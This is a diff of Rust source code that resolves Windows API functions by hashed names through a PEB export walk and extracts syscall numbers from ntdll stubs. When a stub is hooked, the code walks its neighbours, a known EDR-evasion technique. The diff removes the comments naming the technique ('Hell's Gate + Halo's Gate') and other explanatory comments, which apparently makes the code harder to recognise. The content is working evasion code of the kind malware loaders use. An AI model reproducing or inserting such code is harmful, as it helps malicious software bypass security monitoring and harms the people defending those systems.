@@ -12,7 +12,6 @@ use crate::defs::*;
 use crate::utils::djb2;
 
 // ─── PEB export walk ─────────────────────────────────────────────────────────
-// Returns fn pointer by djb2 hash of module + export name
 
 pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*const u8> {
     let peb: usize;
@@ -20,7 +19,6 @@ pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*c
     if peb == 0 { return None; }
 
     let ldr        = *((peb + 0x18) as *const usize) as *const u8;
-    // Walk InLoadOrderModuleList
     let list_head  = ldr.add(0x10) as *const usize;
     let mut flink  = *list_head as *const u8;
 
@@ -31,7 +29,6 @@ pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*c
         let name_len  = (*name_us).Length as usize / 2;
 
         if !base.is_null() && name_len > 0 {
-            // Hash the module name (wide → lower ASCII)
             let mut mh: u32 = 5381;
             for i in 0..name_len {
                 let c = (*name_buf.add(i)) as u8;
@@ -40,7 +37,6 @@ pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*c
             }
 
             if mh == module_hash {
-                // Walk export table
                 if (base as *const u16).read_unaligned() != IMAGE_DOS_SIGNATURE { return None; }
                 let e_lfanew  = (base.add(0x3C) as *const u32).read_unaligned() as usize;
                 let opt_base  = e_lfanew + 4 + 20;
@@ -54,7 +50,6 @@ pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*c
                 for i in 0..n_names {
                     let name_rva = (base.add(names_rva + i*4) as *const u32).read_unaligned() as usize;
                     let name_ptr = base.add(name_rva);
-                    // Hash export name
                     let mut eh: u32 = 5381;
                     let mut j = 0usize;
                     loop {
@@ -79,35 +74,24 @@ pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*c
     None
 }
 
-// ─── SSN extraction (Hell's Gate + Halo's Gate) ───────────────────────────────
+// ─── SSN extraction ───────────────────────────────────────────────────────────
 
 pub unsafe fn extract_ssn(stub: *const u8) -> Option<u16> {
-    // Direct: 4C 8B D1 B8 XX XX 00 00
     if *stub.add(0) == 0x4C && *stub.add(1) == 0x8B && *stub.add(2) == 0xD1
        && *stub.add(3) == 0xB8 {
         let lo = *stub.add(4) as u16;
         let hi = *stub.add(5) as u16;
         return Some(lo | (hi << 8));
     }
-
-    // Hooked (E9 jmp) — walk neighbors
     if *stub == 0xE9 {
         for delta in 1u16..=32 {
             for sign in [1i32, -1i32] {
                 let offset   = (delta as usize) * 32;
-                let neighbor = if sign > 0 {
-                    stub.add(offset)
-                } else {
-                    stub.sub(offset)
-                };
+                let neighbor = if sign > 0 { stub.add(offset) } else { stub.sub(offset) };
                 if *neighbor.add(0) == 0x4C && *neighbor.add(1) == 0x8B
                    && *neighbor.add(2) == 0xD1 && *neighbor.add(3) == 0xB8 {
                     let base_ssn = (*neighbor.add(4) as u16) | ((*neighbor.add(5) as u16) << 8);
-                    let ssn = if sign > 0 {
-                        base_ssn.wrapping_sub(delta)
-                    } else {
-                        base_ssn.wrapping_add(delta)
-                    };
+                    let ssn = if sign > 0 { base_ssn.wrapping_sub(delta) } else { base_ssn.wrapping_add(delta) };
                     return Some(ssn);
                 }
             }
